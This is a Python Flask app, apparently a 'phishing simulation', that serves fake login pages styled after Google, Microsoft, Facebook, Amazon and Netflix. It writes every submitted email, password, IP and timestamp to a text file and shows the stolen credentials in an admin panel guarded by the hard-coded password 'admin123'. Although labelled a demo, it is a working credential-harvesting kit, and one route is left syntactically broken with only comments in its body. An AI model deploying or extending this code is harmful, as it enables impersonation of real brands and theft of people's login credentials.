from flask import Flask, render_template, request, redirect, url_for, session
import datetime

app = Flask(__name__)
app.secret_key = "phish_sim_secret_key"  # Add a secret key for sessions

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        ip = request.remote_addr
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open('captured_data.txt', 'a') as f:
            f.write(f"Email: {email}, Password: {password}, IP: {ip}, Time: {timestamp}\n")
        return "Thanks! You've been 'phished' for demo purposes 😄"
    return render_template('login.html')

@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    error = None
    if request.method == 'POST':
        if request.form.get('username') == 'admin' and request.form.get('password') == 'admin123':
            session['logged_in'] = True
            return redirect(url_for('admin'))
        else:
            error = 'Invalid credentials'
    return render_template('admin_login.html', error=error)

@app.route('/admin')
def admin():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    data = []
    try:
        with open('captured_data.txt', 'r') as f:
            for line in f:
                parts = line.strip().split(', ')
                email = parts[0].replace('Email: ', '')
                password = parts[1].replace('Password: ', '')
                ip = parts[2].replace('IP: ', '') if len(parts) > 2 else 'Unknown'
                time = parts[3].replace('Time: ', '') if len(parts) > 3 else 'Unknown'
                data.append([email, password, ip, time])
    except FileNotFoundError:
        pass
    
    return render_template('admin.html', data=data)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('admin_login'))

@app.route('/template/<template_name>', methods=['GET', 'POST'])
def phishing_template(template_name):
    if request.method == 'POST':
        # Handle form submission similar to login route
        # ...
    
    templates = {
        'google': 'login.html',
        'microsoft': 'microsoft_login.html',
        'facebook': 'facebook_login.html',
        'amazon': 'amazon_login.html',
        'netflix': 'netflix_login.html'
    }
    
    if template_name in templates:
        return render_template(templates[template_name])
    else:
        return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug=True)
